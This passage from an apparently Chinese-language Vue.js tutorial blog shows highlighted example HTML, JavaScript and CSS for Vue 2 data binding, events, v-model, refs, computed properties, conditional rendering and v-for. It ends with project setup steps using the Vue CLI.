class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!-- 绑定方法中返回的数据 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;websiteTag&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!-- 绑定一个html标签 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!-- 省略的绑定方式 --&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-events&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- click event --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;age++&quot;</span>&gt;</span>add a year<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;age--&quot;</span>&gt;</span>subtract a year<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">dblclick</span>=<span class="hljs-string">&quot;add(10)&quot;</span>&gt;</span>add 10 year<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-comment">&lt;!-- 点击两次 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:dblclick</span>=<span class="hljs-string">&quot;subtract(10)&quot;</span>&gt;</span>subtract 10 year<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <span class="hljs-comment">&lt;!-- 点击两次 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我的年龄是: &#123;&#123; age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-comment">&lt;!-- mousemove event --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;canvas&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;updateXY&quot;</span>&gt;</span>&#123;&#123;x&#125;&#125;, &#123;&#123;y&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-comment">&lt;!-- 事件修饰符 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> @<span class="hljs-attr">click.prevent</span>=<span class="hljs-string">&quot;handleClick()&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;www.baidu.com&quot;</span>&gt;</span>百度<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-comment">&lt;!-- 阻止默认事件 --&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-key&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-on:keyup</span>=<span class="hljs-string">&quot;logName&quot;</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-on:keydown.enter</span>=<span class="hljs-string">&quot;logName&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 键盘按enter 触发--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-on:keyup</span>=<span class="hljs-string">&quot;logAge&quot;</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-on:keyup.alt.enter</span>=<span class="hljs-string">&quot;logAge&quot;</span> /&gt;</span> <span class="hljs-comment">&lt;!-- 键盘同时按 alt 和 enter 触发 --&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-model&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!-- 双向数据绑定支持的标签 input, select, textarea。因为需要有输入输出才是双向数据绑定 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model.lazy</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span> <span class="hljs-comment">&lt;!-- .lazy懒加载 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>输入的内容是: &#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;age&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>输入的年龄是: &#123;&#123; age &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-ref&quot;</span>&gt;</span>        <span class="hljs-comment">&lt;!--  ref=&quot;name&quot;绑定在元素中，在js中使用$refs.name可以访问该绑定的元素--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>姓名<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;name&quot;</span> @<span class="hljs-attr">keyup</span>=<span class="hljs-string">&quot;getName&quot;</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>年龄<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;age&quot;</span> @<span class="hljs-attr">keyup</span>=<span class="hljs-string">&quot;getAge&quot;</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>&#123;&#123;age&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>language-html复制代码</code></pre><h4 id="1-4-2、JS代码"><a href="#1-4-2、JS代码" class="headerlink" title="1.4.2、JS代码"></a>1.4.2、JS代码</h4><pre><code class="hljs js"><span class="hljs-comment">// 实例化 vue 对象</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#vue-app&quot;</span>, <span class="hljs-comment">// element</span>    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;            <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;hjxstart&quot;</span>,            <span class="hljs-attr">wechat</span>: <span class="hljs-number">27732357</span>,            <span class="hljs-attr">websiteTag</span>: <span class="hljs-string">&#x27;&lt;a href=&quot;https://www.taobao.com&quot;&gt;taobao&lt;/a&gt;&#x27;</span>        &#125;    &#125;,    <span class="hljs-attr">methods</span>: &#123;        <span class="hljs-title function_">greet</span>(<span class="hljs-params">time</span>) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-string">`Good <span class="hljs-subst">$&#123;time&#125;</span> <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>;        &#125;    &#125;,&#125;)<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#vue-events&quot;</span>,    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;            <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,            <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>,            <span class="hljs-attr">y</span>: <span class="hljs-number">0</span>,        &#125;;    &#125;,    <span class="hljs-attr">methods</span>: &#123;        <span class="hljs-title function_">add</span>(<span class="hljs-params">inc</span>) &#123;            <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> += inc;        &#125;,        <span class="hljs-title function_">subtract</span>(<span class="hljs-params">dec</span>) &#123;            <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> -= dec;        &#125;,        <span class="hljs-title function_">updateXY</span>(<span class="hljs-params">event</span>) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(event);            <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = event.<span class="hljs-property">offsetX</span>;            <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = event.<span class="hljs-property">offsetY</span>;        &#125;,        <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"></span>) &#123;            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hello&quot;</span>);        &#125;    &#125;&#125;)<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#vue-key&quot;</span>,    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;                    &#125;    &#125;,    <span class="hljs-attr">methods</span>: &#123;        <span class="hljs-title function_">logName</span>(<span class="hljs-params"></span>) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;正在输入名字&quot;</span>);        &#125;,        <span class="hljs-title function_">logAge</span>(<span class="hljs-params"></span>) &#123;            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;正在输入年龄&quot;</span>);        &#125;    &#125;&#125;)<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#vue-model&quot;</span>,    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27; &#x27;</span>,            <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>        &#125;    &#125;,    <span class="hljs-attr">methods</span>: &#123;            &#125;,&#125;)<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#vue-ref&quot;</span>,    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>,            <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>        &#125;    &#125;,    <span class="hljs-attr">methods</span>: &#123;        <span class="hljs-title function_">getName</span>(<span class="hljs-params"></span>) &#123;            <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">name</span>.<span class="hljs-property">value</span>;        &#125;,        <span class="hljs-title function_">getAge</span>(<span class="hljs-params"></span>) &#123;            <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">$refs</span>.<span class="hljs-property">age</span>.<span class="hljs-property">value</span>;        &#125;    &#125;,&#125;)language-js复制代码</code></pre><p>1.4.3、Css代码</p><pre><code class="hljs css"><span class="hljs-selector-id">#canvas</span> &#123;  <span class="hljs-attribute">width</span>: <span class="hljs-number">600px</span>;  <span class="hljs-attribute">padding</span>: <span class="hljs-number">200px</span> <span class="hljs-number">20px</span>;  <span class="hljs-attribute">text-align</span>: center;  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#333</span>;&#125;language-css复制代码</code></pre><hr><h1 id="第二章-CDN开发下"><a href="#第二章-CDN开发下" class="headerlink" title="第二章 CDN开发下"></a>第二章 CDN开发下</h1><h2 id="2-1、watch"><a href="#2-1、watch" class="headerlink" title="2.1、watch"></a>2.1、watch</h2><p><strong>不建议生产环境使用，开发调试可以</strong>。watch的用法如下</p><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;            <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 1.需要在data中有声明</span>        &#125;    &#125;,    <span class="hljs-attr">watch</span>: &#123;        <span class="hljs-title function_">name</span>(<span class="hljs-params">val, ordVal</span>) &#123; <span class="hljs-comment">// 2.在watch中的方法名为key_name;（新值，旧值）</span>        &#125;    &#125;&#125;)language-js复制代码</code></pre><hr><h2 id="2-2、computed"><a href="#2-2、computed" class="headerlink" title="2.2、computed"></a>2.2、computed</h2><p><strong>用途：优化性能，用于计算频率高的场景，例如样式、搜索等</strong></p><ol><li>和watch、method的性能区别，computed只有在值发生变化的时候才触发。</li><li>computed的里面的每一个方法一定要有<strong>return</strong>。</li><li>computed的用法如下</li></ol><pre><code class="hljs html">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-computed&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;a++&quot;</span>&gt;</span>Add to A <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;b++&quot;</span>&gt;</span>Add to B <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>A - &#123;&#123;a&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>B - &#123;&#123;b&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-comment">&lt;!-- methods --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age + A = &#123;&#123;addToA1()&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age + B = &#123;&#123;addToB1()&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-comment">&lt;!-- computed, 因为是属性不可以加括号 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age + A = &#123;&#123; addToA2 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age + B = &#123;&#123; addToB2 &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>language-html复制代码new Vue(&#123;    el: &quot;#vue-computed&quot;,    data() &#123;        return &#123;            a: 0,            b: 0,            age: 18,        &#125;    &#125;,    methods: &#123;        addToA1() &#123;            console.log(&quot;addToA1&quot;);            return this.age + this.a;        &#125;,        addToB1() &#123;            console.log(&quot;addToB1&quot;);            return this.age + this.b;        &#125;,    &#125;,    computed: &#123;        addToA2() &#123;            console.log(&quot;addToA2&quot;);            return this.age + this.a;        &#125;,        addToB2() &#123;            console.log(&quot;addToB2&quot;);            return this.age + this.b;        &#125;,    &#125;&#125;)language-js复制代码</code></pre><hr><h2 id="2-3、动态绑定Css"><a href="#2-3、动态绑定Css" class="headerlink" title="2.3、动态绑定Css"></a>2.3、动态绑定Css</h2><p><strong>使用computed动态绑定Css</strong></p><ol><li>html代码</li></ol><pre><code class="hljs html">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-css&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>动态绑定样式 两种方式<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>示例1 属性绑定<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;mrChangeColor = !mrChangeColor&quot;</span> <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;&#123;changeColor:mrChangeColor&#125;&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>示例2 计算属性绑定<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;mrChangeColor = !mrChangeColor&quot;</span>&gt;</span>ChangeColor<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;changeLength = !changeLength&quot;</span>&gt;</span>changeLength<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>  <span class="hljs-attr">v-bind:class</span>=<span class="hljs-string">&quot;compClasses&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>language-html复制代码</code></pre><ol><li>js代码</li></ol><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#vue-css&quot;</span>,    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;            <span class="hljs-attr">mrChangeColor</span>: <span class="hljs-literal">false</span>,            <span class="hljs-attr">changeLength</span>: <span class="hljs-literal">false</span>,        &#125;    &#125;,    <span class="hljs-attr">computed</span>: &#123;        <span class="hljs-title function_">compClasses</span>(<span class="hljs-params"></span>) &#123;            <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">changeColor</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">mrChangeColor</span>, <span class="hljs-attr">changeLength</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">changeLength</span> &#125;        &#125;    &#125;&#125;)language-js复制代码</code></pre><ol><li>css代码</li></ol><pre><code class="hljs css"><span class="hljs-selector-id">#vue-css</span> <span class="hljs-selector-tag">span</span> &#123;  <span class="hljs-attribute">background</span>: red;  <span class="hljs-attribute">display</span>: inline-block;  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;  <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-selector-id">#vue-css</span> <span class="hljs-selector-class">.changeColor</span> <span class="hljs-selector-tag">span</span> &#123;  <span class="hljs-attribute">background</span>: green;&#125;<span class="hljs-selector-id">#vue-css</span> <span class="hljs-selector-class">.changeLength</span> <span class="hljs-selector-tag">span</span><span class="hljs-selector-pseudo">:after</span> &#123;  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;hjxstart&quot;</span>;  <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">10px</span>;&#125;language-css复制代码</code></pre><hr><h2 id="2-4、if和show指令"><a href="#2-4、if和show指令" class="headerlink" title="2.4、if和show指令"></a>2.4、if和show指令</h2><p><strong>if调试内容是一行注释，show调试内容是标签并且有属性display: none</strong></p><ol><li>示例</li></ol><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-if&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>v-if指令<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;error = !error&quot;</span>&gt;</span>toggle<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;success = !success&quot;</span>&gt;</span>success<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>error:如果error=true，那么显示<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-comment">&lt;!-- 调试不显示标签内容，只是一行注释 --&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-else-if</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>success: 如果error=false,success=true则显示<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-else</span>&gt;</span>如果error和success都为假，那么显示<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>v-show指令<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;error&quot;</span>&gt;</span>网络连接错误 404<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-comment">&lt;!-- 调试显示标签内容：display: none--&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>网络连接成功 200<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>language-html复制代码</code></pre><hr><h2 id="2-5、v-for指令"><a href="#2-5、v-for指令" class="headerlink" title="2.5、v-for指令"></a>2.5、v-for指令</h2><p><strong>遍历时，如果不需要外出容器，可以使用template标签作为遍历对象</strong></p><ol><li>html代码</li></ol><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;vue-for&quot;</span></span><span class="hljs-tag">&lt;<span class="hljs-attr">template</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(character,index) in characters&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>index<span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>character<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>language-html复制代码</code></pre><ol><li>js代码</li></ol><pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;    <span class="hljs-attr">el</span>: <span class="hljs-string">&quot;#vue-for&quot;</span>,    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;        <span class="hljs-keyword">return</span> &#123;            <span class="hljs-attr">characters</span>: [<span class="hljs-string">&quot;Vue&quot;</span>, <span class="hljs-string">&quot;Java&quot;</span>, <span class="hljs-string">&quot;MySQL&quot;</span>, <span class="hljs-string">&quot;Linux&quot;</span>],        &#125;    &#125;,&#125;)language-js复制代码</code></pre><hr><h2 id="2-6、注册全局组件"><a href="#2-6、注册全局组件" class="headerlink" title="2.6、注册全局组件"></a>2.6、注册全局组件</h2><hr><h2 id="2-7、fetch请求"><a href="#2-7、fetch请求" class="headerlink" title="2.7、fetch请求"></a>2.7、fetch请求</h2><hr><h2 id="2-8、Axios请求"><a href="#2-8、Axios请求" class="headerlink" title="2.8、Axios请求"></a>2.8、Axios请求</h2><hr><h1 id="第三章-CLI脚手架"><a href="#第三章-CLI脚手架" class="headerlink" title="第三章 CLI脚手架"></a>第三章 CLI脚手架</h1><h2 id="3-1、安装脚手架"><a href="#3-1、安装脚手架" class="headerlink" title="3.1、安装脚手架"></a>3.1、安装脚手架</h2><hr><h2 id="3-2、组件属性传值和传引用"><a href="#3-2、组件属性传值和传引用" class="headerlink" title="3.2、组件属性传值和传引用"></a>3.2、组件属性传值和传引用</h2><hr><h2 id="3-3、注册事件"><a href="#3-3、注册事件" class="headerlink" title="3.3、注册事件"></a>3.3、注册事件</h2><hr><h2 id="3-4、生命函数钩子"><a href="#3-4、生命函数钩子" class="headerlink" title="3.4、生命函数钩子"></a>3.4、生命函数钩子</h2><hr><h2 id="3-5、slot插槽的使用"><a href="#3-5、slot插槽的使用" class="headerlink" title="3.5、slot插槽的使用"></a>3.5、slot插槽的使用</h2><hr><h2 id="3-6、动态组件和缓存"><a href="#3-6、动态组件和缓存" class="headerlink" title="3.6、动态组件和缓存"></a>3.6、动态组件和缓存</h2><hr><h1 id="第四章-路由-axios"><a href="#第四章-路由-axios" class="headerlink" title="第四章 路由+axios"></a>第四章 路由+axios</h1><h1 id="饿了么app"><a href="#饿了么app" class="headerlink" title="饿了么app"></a>饿了么app</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2><h3 id="2-项目创建步骤"><a href="#2-项目创建步骤" class="headerlink" title="2.项目创建步骤"></a>2.项目创建步骤</h3><ol><li>在当前路径下创建一个项目</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># vue create .</span></code></pre><ol><li>同意在当前文件夹下创建项目：y</li><li>选择对应的版本：Manually select features</li><li>空格选择要使用：choose vue version, Babel, Vuex, Router;</li><li>回车选择2.X</li><li>同意选择使用 Use history mode for router</li><li>选择 package.json</li><li>不保存：n</li><li>调整一下项目文件的命名和位置：参考4.1项目说明</li><li>项目启动命令：</li></ol><pre><code class="hljs bash">npm run serve</code></pre><h3 id="3-功能实现过程"><a href="#3-功能实现过程" class="headerlink" title="3.功能实现过程"></a>3.功能实现过程</h3><h4 id="3-1实现登陆模块"><a href="#3-1实现登陆模块" 